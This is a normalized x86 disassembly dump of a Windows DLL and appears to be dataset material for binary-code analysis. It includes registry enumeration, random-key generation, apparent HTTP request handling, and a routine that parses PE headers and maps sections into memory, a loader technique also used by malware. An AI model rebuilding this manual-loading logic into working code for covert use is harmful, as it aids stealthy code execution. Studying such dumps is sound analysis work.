mov eax [ ecx + 0xc ]
call eax
mov [ esi ] eax
test eax eax
jns r-xdata
push 0x30
lea eax [ ebp - 0x44 ]
push 0x0
push eax
call sub_1007f8f0
add esp 0xc
lea ecx [ ebp - 0x14 ]
push ecx
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x12 ]
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0xe ]
mov [ ebp - 0x40 ] cx
mov ecx [ ebp - 0xa ]
mov [ ebp - 0x3e ] ax
movzx eax [ ebp - 0xc ]
mov [ ebp - 0x3c ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x32 ] cx
mov edx 0x30
mov [ ebp - 0x44 ] dx
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x24 ] 0x7
mov edx [ eax ]
mov edx [ edx + 0xc ]
push ecx
push eax
call edx
mov [ esi ] eax
test eax eax
jns r-xdata
mov eax [ esi + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x48 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax [ esi ]
sub_10011093
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_10049f3a
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_1005b670
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_10049f3a
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_10049f3a
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10049f3a
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_1001903e
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_1005b670
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_10041241
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_1005b670
mov [ eax ] 0xd
call sub_1003a6bb
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_1003a6bb
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_1005b670
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_10005cc9
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_1001903e
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
jne r-xdata
sub_10011260
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x18 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x18 ]
mov [ edx + eax - 0x18 ] r--data
mov ecx [ eax - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x8 ] r--data
mov ecx [ eax - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x18 ] r--data
push eax
mov [ eax ] r--data
call sub_10027450
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_100112c0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1008934e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x140
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x138 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x150 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x1c ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov ebx ecx
mov ecx [ ebp + 0x18 ]
mov [ esp + 0x2c ] eax
xor eax eax
mov [ ecx ] eax
mov [ esp + 0x20 ] ecx
push 0xffffffff
xor ecx ecx
mov [ esp + 0x2c ] edx
mov [ edx ] eax
push eax
lea edx [ ebx + 0x24 ]
mov [ esp + 0x5c ] cx
push edx
lea ecx [ esp + 0x60 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x74 ] 0x7
mov [ esp + 0x70 ] eax
call sub_1002d970
mov [ esp + 0x158 ] 0x0
cmp [ ebx + 0xb8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ esp + 0x68 ] 0x8
jb r-xdata
cmp eax 0x1
jne r-xdata
push esi
mov ecx edi
lea esi [ esp + 0x3c ]
call sub_10068a40
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ esp + 0x60 ]
mov [ esp + 0x164 ] 0x1
call sub_1006da10
mov [ esp + 0x158 ] 0x0
cmp [ esp + 0x4c ] 0x8
jb r-xdata
mov eax 0x64
jmp r-xdata
mov eax [ esp + 0x54 ]
push eax
call sub_1000a86e
add esp 0x4
lea edx [ esp + 0xd0 ]
mov eax 0xa
call sub_10071e30
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
lea edx [ esp + 0xc4 ]
mov eax 0x9
call sub_10071e30
lea edx [ esp + 0xe4 ]
mov eax 0x4f
call sub_10071e30
lea edx [ esp + 0xc4 ]
lea eax [ esp + 0xe4 ]
mov [ esp + 0x14 ] edx
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] esi
mov [ esp + 0x24 ] edi
mov ecx [ esp + 0x38 ]
push ecx
call sub_1000a86e
add esp 0x4
jmp r-xdata
mov ecx [ esp + 0x150 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x138 ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn 0x18
xor esi esi
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
xor edx edx
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
mov esi 0x1000
jmp r-xdata
neg eax
sbb eax eax
and eax 0x800000
or eax edx
push 0x0
or eax esi
or eax 0x84600900
push eax
mov eax [ esp + 0x1c ]
push 0x0
push 0x0
lea edx [ esp + 0xe0 ]
push edx
mov edx [ ebx + 0xd4 ]
push ecx
mov ecx [ ebx + 0xc4 ]
push eax
push ecx
call edx
mov edi eax
mov [ esp + 0x30 ] edi
test edi edi
jne r-xdata
lea ecx [ esp + 0x54 ]
mov edx 0x2000
jmp r-xdata
test eax eax
je r-xdata
cmp [ ebx + 0xb0 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
push eax
lea eax [ esp + 0x3c ]
push eax
call sub_10057f20
push eax
mov edx r--data
lea esi [ esp + 0x7c ]
mov [ esp + 0x164 ] 0x2
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x104
mov [ esp + 0x158 ] 0x3
call sub_10022b50
mov esi 0x8
cmp [ esp + 0x84 ] esi
jb r-xdata
cmp [ esp + 0x68 ] 0x8
mov ecx [ esp + 0x54 ]
jae r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
push eax
mov eax [ ebx + 0xe4 ]
push ecx
push 0x0
push edx
push edi
call eax
test eax eax
jne r-xdata
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
xor edx edx
mov [ esp + 0x84 ] 0x7
mov [ esp + 0x80 ] 0x0
mov [ esp + 0x70 ] dx
cmp [ esp + 0x4c ] esi
jb r-xdata
mov ecx [ esp + 0x70 ]
push ecx
call sub_1000a86e
add esp 0x4
mov esi [ esp + 0x2c ]
mov ecx [ ebx + 0xdc ]
push 0x0
lea eax [ esp + 0x38 ]
push eax
push esi
push 0x20000013
push edi
mov [ esp + 0x48 ] 0x4
call ecx
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
lea ecx [ esp + 0xac ]
push ecx
call sub_10057f20
push eax
mov edx r--data
lea esi [ esp + 0x44 ]
mov [ esp + 0x164 ] 0x4
call sub_10040e00
add esp 0xc
push eax
mov edx r--data
lea esi [ esp + 0x90 ]
mov [ esp + 0x15c ] 0x5
call sub_100519f0
add esp 0x4
mov ecx eax
lea eax [ esp + 0x54 ]
lea esi [ esp + 0x70 ]
mov [ esp + 0x158 ] 0x6
call sub_1006acf0
mov edx eax
mov ecx 0x104
mov [ esp + 0x158 ] 0x7
call sub_10022b50
mov esi 0x8
cmp [ esp + 0x84 ] esi
jb r-xdata
mov edx [ ebx + 0xcc ]
push 0x4
lea ecx [ esp + 0x18 ]
push ecx
push 0x1f
push edi
mov [ esp + 0x24 ] 0x100
call edx
mov [ esp + 0x10 ] 0x1
jmp r-xdata
mov eax [ esp + 0x38 ]
push eax
call sub_1000a86e
add esp 0x4
cmp [ esi ] 0x12e
je r-xdata
call [ GetLastError@IAT ]
push eax
lea edx [ esp + 0x3c ]
push edx
call sub_10057f20
push eax
mov edx r--data
lea esi [ esp + 0xb4 ]
mov [ esp + 0x164 ] 0x8
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x104
mov [ esp + 0x158 ] 0x9
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ esp + 0x38 ]
mov [ esp + 0x158 ] 0x0
call sub_100702e0
mov [ esp + 0x10 ] 0x3
jmp r-xdata
xor eax eax
mov [ esp + 0x84 ] 0x7
mov [ esp + 0x80 ] 0x0
mov [ esp + 0x70 ] ax
cmp [ esp + 0xa0 ] esi
jb r-xdata
mov edx [ esp + 0x70 ]
push edx
call sub_1000a86e
add esp 0x4
mov esi [ esp + 0x20 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ ebx + 0xd8 ]
push edi
call eax
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov esi [ esp + 0x28 ]
push edi
mov edi [ esp + 0x24 ]
call sub_1001a5e0
mov edi [ esp + 0x30 ]
mov [ esp + 0x10 ] eax
xor edx edx
mov [ esp + 0xa0 ] 0x7
mov [ esp + 0x9c ] 0x0
mov [ esp + 0x8c ] dx
cmp [ esp + 0x4c ] esi
jb r-xdata
mov ecx [ esp + 0x8c ]
push ecx
call sub_1000a86e
add esp 0x4
cmp [ esp + 0x68 ] 0x8
jb r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ esp + 0x28 ]
mov [ esi ] 0x0
mov [ ecx ] 0x0
xor ecx ecx
mov [ esp + 0x158 ] cl
mov [ esp + 0x4c ] 0x7
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] cx
cmp [ esp + 0xbc ] esi
jb r-xdata
mov eax [ esp + 0x38 ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x54 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ esp + 0x10 ] 0x2
jmp r-xdata
mov edx [ esp + 0xa8 ]
push edx
call sub_1000a86e
add esp 0x4
sub_10011800
push ebp
mov ebp esp
push 0xffffffff
push sub_10087bd6
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx ebx
call sub_10005320
test eax eax
je r-xdata
mov ecx ebx
call sub_1001e4a0
test eax eax
jne r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_100449d0
test eax eax
je r-xdata
mov eax 0x7
jmp r-xdata
mov ecx ebx
call sub_10046a30
test eax eax
je r-xdata
xor edi edi
mov [ ebp - 0x98 ] 0xf
mov [ ebp - 0x9c ] edi
mov [ ebp - 0xac ] 0x0
lea edx [ ebp - 0x80 ]
lea eax [ edi + 0x9 ]
mov [ ebp - 0x4 ] edi
call sub_1002f620
push edi
push 0x1
push edi
push edi
lea eax [ ebp - 0xcc ]
push eax
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push 0xffffffff
push edi
push rw-data
lea ecx [ ebx + 0x40 ]
call sub_1002d970
mov edi ebx
call sub_1001f950
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx ebx
call sub_100548a0
mov ecx ebx
call sub_10054d50
mov ecx ebx
call sub_10050ad0
test eax eax
je r-xdata
mov eax 0x8
jmp r-xdata
mov eax [ ebp - 0xcc ]
lea edx [ ebp - 0x18 ]
push edx
push 0x6
push eax
call [ CryptGenRandom@IAT ]
push edi
test eax eax
jne r-xdata
cmp [ ebp - 0x98 ] 0x10
jb r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0x116
call sub_1002f620
mov eax 0x5
jmp r-xdata
mov ecx ebx
call sub_100428f0
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0xf5
call sub_1002f620
mov eax 0x6
jmp r-xdata
mov edx [ ebp - 0xcc ]
push edx
call [ CryptReleaseContext@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xcc ]
push ecx
call [ CryptReleaseContext@IAT ]
lea ecx [ ebp - 0xac ]
call sub_10003250
mov eax 0x2
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0xac ]
push ecx
call sub_1000a86e
add esp 0x4
mov ecx ebx
call sub_1001a0d0
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0xd5
call sub_1002f620
push 0x6
lea ecx [ ebp - 0x18 ]
lea esi [ ebp - 0xc8 ]
call sub_100662b0
add esp 0x4
push eax
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x1
call sub_1003acf0
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10003250
cmp [ ebp - 0x98 ] 0x10
mov eax [ ebp - 0xac ]
jae r-xdata
lea ecx [ ebp - 0xac ]
call sub_10003250
mov eax 0x3
jmp r-xdata
call sub_10044b20
mov esi eax
test esi esi
jne r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x12d
call sub_1002f620
push 0x9
lea ecx [ ebp - 0x2c ]
push ecx
push 0xffffffff
push eax
push 0x1
push edi
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xac ]
push 0x0
lea edx [ ebx + 0x138 ]
push ebx
mov ecx esi
call sub_1004a7c0
test eax eax
je r-xdata
lea eax [ esi + 0x9 ]
jmp r-xdata
lea edx [ ebx + 0x40 ]
push edx
lea edx [ ebp - 0x2c ]
call sub_10019010
mov edi ebx
call sub_1001f950
test eax eax
je r-xdata
lea ecx [ ebp - 0xac ]
call sub_10003250
mov eax 0x4
jmp r-xdata
push esi
call [ LocalFree@IAT ]
push ebx
call sub_10021420
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0xa7
call sub_1002f620
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10003250
lea edx [ ebp - 0x80 ]
mov eax 0x116
call sub_1002f620
lea ecx [ ebp - 0xac ]
call sub_10003250
mov eax 0x5
jmp r-xdata
push ebx
call sub_10044cc0
test eax eax
je r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0xb9
call sub_1002f620
mov eax 0xb
jmp r-xdata
mov ecx ebx
call sub_1001fd20
test eax eax
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0xa8
call sub_1002f620
mov eax 0xc
jmp r-xdata
xor eax eax
lea edx [ ebp - 0x90 ]
mov eax 0xb2
call sub_1002f620
mov eax 0xd
jmp r-xdata
sub_10011b4a
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100635e8
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_100821a0
sub_10011ba0
push ebp
mov ebp esp
sub esp 0x42c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
lea edx [ ebp - 0x418 ]
push edx
push 0x20119
xor esi esi
push esi
push ecx
push eax
mov [ ebp - 0x41c ] esi
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x418 ]
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x420 ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x420 ] esi
jbe r-xdata
mov edx [ ebp - 0x418 ]
push edx
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x418 ]
push ecx
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x41c ]
xor ecx ebp
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
push edi
mov edi [ RegEnumValueW@IAT ]
jmp r-xdata
lea eax [ ebp - 0x424 ]
push eax
lea ecx [ ebp - 0x20c ]
push ecx
lea edx [ ebp - 0x42c ]
push edx
mov edx [ ebp - 0x418 ]
push 0x0
lea eax [ ebp - 0x428 ]
push eax
lea ecx [ ebp - 0x414 ]
push ecx
push esi
push edx
mov [ ebp - 0x428 ] 0x104
mov [ ebp - 0x424 ] 0x208
call edi
test eax eax
jne r-xdata
inc esi
cmp esi [ ebp - 0x420 ]
jb r-xdata
cmp [ ebp - 0x42c ] 0x1
jne r-xdata
jmp r-xdata
push ebx
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
pop edi
mov [ ebp - 0x41c ] 0x1
sub_10011cd0
push esi
mov esi [ eax ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push edi
mov edi [ lstrcmpW@IAT ]
mov edi edi
pop edi
mov eax esi
pop esi
retn
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov ecx [ ebx ]
mov eax [ esi ]
push ecx
mov ecx [ eax ]
push ecx
call edi
test eax eax
je r-xdata
sub_10011d03
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fldz
mov eax [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
xor eax [ ebp + 0xc ]
and eax 0x7fffffff
xor eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
leave
retn
sub_10011d2b
mov edi edi
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x48 ] 0x0
and [ ebp - 0x4c ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_100315c0
add esp 0x18
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_100669c6
fstp [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
fld [ ebp - 0x44 ]
shl eax 0x2
push eax
push ecx
fstp [ esp ]
call sub_100079e1
pop ecx
fstp [ ebp - 0x44 ]
pop ecx
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
fld [ ebp - 0x44 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x20
sub_10011df0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008647b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_10029fc7
push 0x4
mov [ ebp - 0x4 ] 0x0
call sub_1002e3ac
mov edi eax
add esp 0x4
test edi edi
je r-xdata
xor edi edi
call sub_1003e875
mov [ edi ] eax
call sub_10004aa4
push 0x0
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_1000c927
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_10003c9c
jmp r-xdata
inc eax
mov [ ebx + 0x4 ] eax
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea edx [ esi + 0x1c ]
mov [ esi + 0x24 ] edx
mov [ esi + 0x38 ] edi
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea edx [ esi + 0x2c ]
mov [ esi + 0x34 ] edx
mov [ eax ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10011ee0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
push edi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] al
mov eax [ ebp + 0x8 ]
push eax
push r--data
mov ecx 0x9
lea edi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] 0x0
call sub_10051270
mov eax edi
add esp 0x8
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edx [ eax + 0x1 ]
pop edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx esi
call sub_1003e780
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10011f58
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10068d85
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0xffffffe0
pop ebp
retn
sub_10011f90
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0xc ]
mov eax 0x5a4d
cmp [ esi ] ax
je r-xdata
push ebx
mov ebx [ esi + 0x3c ]
add ebx esi
cmp [ ebx ] 0x4550
je r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebx + 0x50 ]
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] eax
test eax eax
jne r-xdata
pop ebx
mov eax 0x2
pop esi
mov esp ebp
pop ebp
retn 0x8
push edi
mov edi eax
mov eax [ ebp + 0xc ]
mov ecx 0x10
[ edi ] [ esi ]
mov edi [ eax + 0x3c ]
add edi [ edx + 0x1c ]
mov ecx 0x3e
mov esi ebx
[ edi ] [ esi ]
mov eax [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x3c ]
add ecx eax
mov [ edx + 0x8 ] ecx
movzx esi [ ecx + 0x14 ]
movzx eax [ ebx + 0x14 ]
lea esi [ esi + ecx + 0x18 ]
mov [ ebp - 0x4 ] esi
xor esi esi
lea eax [ eax + ebx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
cmp si [ ecx + 0x6 ]
jae r-xdata
pop ebx
mov eax 0x3
pop esi
mov esp ebp
pop ebp
retn 0x8
pop edi
pop ebx
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ebx [ edx + 0xc ]
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov esi eax
mov ecx 0xa
[ edi ] [ esi ]
mov ecx [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
add eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
push eax
mov eax [ ecx + 0xc ]
add eax [ edx + 0x1c ]
push eax
call sub_1007f580
mov eax [ ebx + 0x4 ]
lea ecx [ ebp - 0x4 ]
add esp 0xc
cmp ecx eax
jae r-xdata
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebx ]
lea edx [ ebp - 0x4 ]
cmp ecx edx
ja r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax ebx
call sub_1000c5c0
mov esi edx
sub esi ecx
sar esi 0x2
cmp eax [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
movzx edx [ ecx + 0x6 ]
mov eax 0x28
add [ ebp - 0x8 ] eax
add [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
cmp eax edx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax ebx
call sub_1000c5c0
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebx ]
mov edx [ ecx + esi * 4 ]
mov [ eax ] edx
jmp r-xdata
sub_10012120
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x60 ]
mov ecx esi
call sub_10001990
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10012150
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10086820
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x24 ]
mov ebx [ ebp + 0x20 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x30 ] ecx
mov ecx [ ebp + 0x18 ]
lea eax [ esp + 0x2c ]
push eax
mov [ esp + 0x2c ] ecx
mov [ esp + 0x18 ] edx
call sub_10007a10
push eax
mov [ esp + 0x6c ] 0x0
call sub_10064f10
mov [ esp + 0x6c ] 0xffffffff
mov edi [ esp + 0x30 ]
